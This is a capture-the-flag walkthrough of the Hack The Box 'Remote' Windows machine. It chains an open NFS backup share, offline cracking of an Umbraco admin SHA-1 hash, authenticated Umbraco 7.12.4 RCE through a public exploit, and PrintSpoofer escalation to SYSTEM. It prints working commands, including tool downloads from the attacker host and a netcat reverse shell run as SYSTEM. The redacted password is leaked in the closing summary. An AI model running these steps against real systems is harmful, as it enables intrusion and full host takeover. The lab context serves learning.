# HTB Remote

**Target:** `10.129.230.172`  
**Operating System:** Windows  
**Attack Chain:** Anonymous FTP/NFS Enumeration → Umbraco Credential Recovery → Authenticated RCE → SeImpersonatePrivilege → SYSTEM

## 1. Enumeration

I began by scanning the target with Nmap to identify open ports, running services, and potential entry points.

```
nmap -sC -sV -p21,80,111,135,139,445,2049,5985 \
  --min-rate 1000 -oN nmap.txt 10.129.230.172
```

The scan revealed the following services:

|Port|Service|Observation|
|---|---|---|
|21|FTP|Microsoft FTP Service; anonymous login allowed|
|80|HTTP|IIS-hosted website, titled Acme Widgets|
|111|RPC|RPC-related service|
|135|MSRPC|Windows RPC|
|139|NetBIOS|SMB-related service|
|445|SMB|Microsoft SMB|
|2049|NFS|NFS export available|
|5985|WinRM|Potential remote Windows management|

Two services immediately stood out: anonymous FTP access and NFS on port 2049. I investigated both before attempting exploitation.

## 2. Anonymous FTP and NFS Enumeration

### 2.1 Anonymous FTP

I connected to the FTP service using the `anonymous` username.

```
ftp 10.129.230.172
```

After entering `anonymous` as the username, authentication succeeded:

```
220 Microsoft FTP Service
331 Anonymous access allowed
230 User logged in.
```

However, listing the directory returned no files. Anonymous access was available, but it did not immediately provide useful content.

I moved on to NFS enumeration.

### 2.2 Discovering the NFS export

I used `showmount` to enumerate the server's exported NFS directories.

```
showmount -e 10.129.230.172
```

The output revealed:

```
Export list for 10.129.230.172:
/site_backups (everyone)
```

The `/site_backups` export was accessible to everyone, making it a promising source of application files and potentially sensitive configuration data.

I mounted the export locally:

```
sudo mkdir -p /mnt/nfs

sudo mount -t nfs \
  10.129.230.172:/site_backups /mnt/nfs
```

I then inspected the mounted directory.

```
cd /mnt/nfs
ls -la
```

The contents resembled an ASP.NET web application:

```
App_Browsers
App_Data
App_Plugins
App_Code
bin
Config
css
default.aspx
Global.asax
Media
scripts
Umbraco
Umbraco_Client
Views
Web.config
```

The presence of directories such as `Umbraco`, `Umbraco_Client`, and `App_Data` suggested that the website was running Umbraco CMS.

The next step was to inspect the application's data files for stored credentials.

## 3. Extracting Umbraco Credentials

Inside `App_Data`, I discovered an Umbraco database file named `Umbraco.sdf`.

```
cd /mnt/nfs/App_Data
ls -la
```

The directory contained:

```
cache
Logs
Models
packages
TEMP
umbraco.config
Umbraco.sdf
```

Since the database was a file-based SQL Server Compact database, I searched its readable strings for account information.

```
strings Umbraco.sdf | grep -i -E 'admin|password|hash'
```

The output included entries resembling:

```
admin
admin@htb.local
b8be16a....<REDACTED>....2f22a04991b90e2aaa
{"hashAlgorithm":"SHA1"}
```

This provided an email address and a password hash associated with the Umbraco administrator.

The hash was a 40-character hexadecimal value, consistent with a SHA-1 digest. I saved the hash to `hash.txt` and attempted to recover its plaintext using Hashcat.

## 4. Cracking the Administrator Password

I used Hashcat mode `100`, which corresponds to raw SHA-1 hashes, with the RockYou wordlist.

```
hashcat -m 100 hash.txt \
  /usr/share/wordlists/rockyou.txt
```

Hashcat successfully recovered the password:

```
b8be16afba8c314ad33d812f22a04991b90e2aaa:<REDACTED>
```

The recovered credentials were:

```
Username: admin@htb.local
Password: <REDACTED>
```

This gave me valid credentials for the Umbraco administration interface.

**Why this worked:** The database backup was readable without authentication, and the administrator's SHA-1 password hash could be cracked offline. The exposed backup therefore provided a path to authenticated application access.

## 5. Authenticated Remote Code Execution in Umbraco

I navigated to the Umbraco administration interface:

```
http://10.129.230.172/umbraco/
```

Using the recovered credentials, I logged in successfully.

After authenticating, I identified the Umbraco version as **7.12.4**.

This version was susceptible to an authenticated remote-code-execution technique involving the XSLT visualization functionality. Since I already had administrator credentials, I could use the application's privileged functionality rather than attempting an unauthenticated exploit.

I used the proof of concept from:

[https://github.com/Jonoans/Umbraco-RCE/](https://github.com/Jonoans/Umbraco-RCE/)

### 5.1 Exploiting Umbraco

Before running the exploit, I started a listener-ready environment on my Kali machine. The proof of concept used ports `4444` and `4445` for its connection workflow, so those ports needed to be available.

I then executed:

```
python exploit.py \
  -u admin@htb.local \
  -p '<REDACTED>' \
  -w 'http://10.129.230.172/' \
  -i 10.10.15.25
```

The exploit authenticated to the Umbraco back-office endpoint and targeted the XSLT visualization functionality.

The relevant output was:

```
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445
[*] Logging in at .../umbraco/backoffice/UmbracoApi/Authentication/PostLogin
[*] Exploiting at .../umbraco/developer/Xslt/xsltVisualize.aspx
[*] Switching to interactive mode
```

The exploit succeeded, giving me an interactive PowerShell session on the target.

I checked the security context:

```
whoami
```

The result was:

```
iis apppool\defaultapppool
```

I had achieved remote code execution, but the shell was running as the IIS application pool identity rather than an administrator.

I then retrieved the user flag from the Public Desktop directory:

```
type C:\Users\Public\Desktop\user.txt
```

**Initial foothold achieved.**

## 6. Windows Privilege Enumeration

With command execution established, I enumerated the privileges assigned to the IIS application pool identity.

```
whoami /priv
```

The important entry was:

```
Privilege Name                Description                      State
----------------------------- -------------------------------- --------
SeImpersonatePrivilege        Impersonate a client after
                              authentication                   Enabled
```

`SeImpersonatePrivilege` allows a process to impersonate a security token under appropriate conditions. On vulnerable Windows configurations, this privilege can be abused through token-impersonation techniques to escalate privileges.

This made PrintSpoofer a potential route to SYSTEM.

However, possessing `SeImpersonatePrivilege` does not automatically guarantee escalation. The technique depends on the Windows environment, available token sources, service configuration, and other conditions.

### 6.1 Checking the Print Spooler service

I checked whether the Print Spooler service was running:

```
Get-Service -Name Spooler
```

The result was:

```
Status   Name      DisplayName
------   ----      -----------
Running  Spooler   Print Spooler
```

The combination of an enabled impersonation privilege and a running Print Spooler made PrintSpoofer worth testing.

## 7. Privilege Escalation with PrintSpoofer

I transferred PrintSpoofer and Netcat to the target from my Kali machine.

On Kali, I hosted the files using a simple HTTP server:

```
python3 -m http.server 8000
```

On the target, I downloaded both executables:

```
curl.exe http://10.10.15.25:8000/PrintSpoofer64.exe -o print.exe

curl.exe http://10.10.15.25:8000/nc.exe -o nc.exe
```

I used the 64-bit PrintSpoofer binary because the target was running 64-bit Windows.

### 7.1 Preparing the reverse shell

On Kali, I started a listener on port `5555`:

```
nc -lvnp 5555
```

Then, from the IIS application pool shell, I executed PrintSpoofer and instructed it to launch Netcat:

```
PS C:\Users\Public\Documents> .\print.exe -c "c:\Users\Public\Documents\nc.exe 10.10.15.25 5555 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

The `CreateProcessAsUser() OK` message indicated that the process-creation stage succeeded.

afterward, the reverse connection arrived at my  listener.

### 7.2 Verifying SYSTEM access

I now had the highest local Windows security context

```
└─$ nc -lnvp 5555                      
listening on [any] 5555 ...
connect to [10.10.15.25] from (UNKNOWN) [10.129.230.172] 49731
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
```

**Root obtained.**

## 8. Attack Chain Summary

The complete path from unauthenticated access to SYSTEM was:

1. **Enumeration:** Identified anonymous FTP, HTTP, SMB, NFS, and WinRM.
    
2. **NFS discovery:** Found the publicly accessible `/site_backups` export.
    
3. **Sensitive file disclosure:** Retrieved the Umbraco application files and database.
    
4. **Password cracking:** Recovered `baconandcheese` from the administrator's SHA-1 hash.
    
5. **Authenticated RCE:** Exploited Umbraco 7.12.4 through its XSLT visualization functionality.
    
6. **Initial foothold:** Obtained command execution as `iis apppool\defaultapppool`.
    
7. **Privilege enumeration:** Discovered enabled `SeImpersonatePrivilege`.
    
8. **Service enumeration:** Confirmed that the Print Spooler was running.
    
9. **Privilege escalation:** Used PrintSpoofer to launch a process as `NT AUTHORITY\SYSTEM`.
    
10. **Objective:** Retrieved the user and root flags.
